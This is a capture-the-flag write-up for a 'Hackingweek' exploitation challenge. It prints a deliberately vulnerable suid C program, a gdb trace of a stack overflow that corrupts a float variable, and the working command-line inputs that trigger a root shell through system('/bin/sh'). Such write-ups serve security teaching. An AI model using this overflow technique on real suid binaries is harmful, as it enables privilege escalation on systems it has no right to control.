# Hackingweek - Exploit02
## Challenge Text

>
Connectez-vous en tant que guest (mot de passe: xxxxxxxxx) sur la machine 37.187.xx.xx. Vous trouverez la clef de validation cachÃ©e dans le fichier /home/exploit02/.secret.
`$> ssh guest@37.187.xx.xx`

- [vuln.c](./vuln.c)

## Solution

We connect to the remote host.
A suid binary with its source code (vuln.c) is in the home directory.


```c
#include <stdio.h>
#include <stdlib.h>

int
main (int argc, char **argv)
{
  if (argc < 3)
    {
      fprintf (stderr, "error: missing argument ! Usage: ./vulnerable 10 AAA\n");
      exit (EXIT_FAILURE);
    }

  int size = atoi(argv[1]);
  float fsize = ((float) size) / 100;
  if (size > 1024)
    {
      fprintf (stderr, "error: cannot go more than 1024 !\n");
      exit (EXIT_FAILURE);
    }
  else if (size < 0)
    {
      fprintf (stderr, "error: cannot be a negative number !\n");
      exit (EXIT_FAILURE);
    }

  float x;
  int i = 0;
  char buffer[1024];

  for (x = 0; x < fsize; x + 0.01)
    buffer[i++] = argv[2][0];

  for (i = 0; i < size; i++)
    printf(" %c", buffer[i]);
  fputs("\n", stdout);

  printf("x = %f\n", x); // Added for debug
  if (x > 80000000000000000000000000000000000000.0)
    system ("/bin/sh");

  return EXIT_SUCCESS;
}
```

The goal is clear : Bypass the following line to pop a shell

```c
if (x > 80000000000000000000000000000000000000.0)
```

### What is x ?


The vulnerable code is here :

```c
float x;
int i = 0;
char buffer[1024];

for (x = 0; x < fsize; x + 0.01)
  buffer[i++] = argv[2][0];
```

- x is never incremented
-> we should have an infinite loop

- the loop stop
-> the buffer overflow on x


We can clearly see it with some gdb magic :
```
$ sh compil.sh && gdb ./a.out
gdb-peda$ break * 0x080486a5
gdb-peda$ command 1
> print buffer
> print x
> continue
> end
gdb-peda$ r 11 a

[..]
Breakpoint 1, 0x080486a5 in main (argc=0x3, argv=0xffffd584) at vuln.c:30
30    for (x = 0; x < fsize; x + 0.01)
$2047 = 'a' <repeats 1023 times>"\377, "
$2048 = 0

Breakpoint 1, 0x080486a5 in main (argc=0x3, argv=0xffffd584) at vuln.c:30
30    for (x = 0; x < fsize; x + 0.01)
$2049 = 'a' <repeats 1024 times>
$2050 = 0

Breakpoint 1, 0x080486a5 in main (argc=0x3, argv=0xffffd584) at vuln.c:30
30    for (x = 0; x < fsize; x + 0.01)
$2051 = 'a' <repeats 1024 times>
$2052 = 1.35925951e-43

Breakpoint 1, 0x080486a5 in main (argc=0x3, argv=0xffffd584) at vuln.c:30
30    for (x = 0; x < fsize; x + 0.01)
$2053 = 'a' <repeats 1024 times>
$2054 = 3.49329694e-41
[..]
```

We can now assume that the value of x will depend on the value of `argv[2][0]`.

### Please let me in

`$ ./a.out 11 $(echo -ne '\x7d')`
>
 } } } } } } } } } } }  
x = 21059140958881314109814530731155652608.000000  
$

Not enough ! We try higher in the ascii table (man ascii).

`./a.out 11 $(echo -ne '\x7e')`
>
 ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~  
x = 84570173979288520027308813300587823104.000000  
# exit  
$


`./a.out 11 $(echo -ne '\x7f')`
>
             
x = 339615136492207134461438014706212143104.000000  
# exit  
$

Job is done.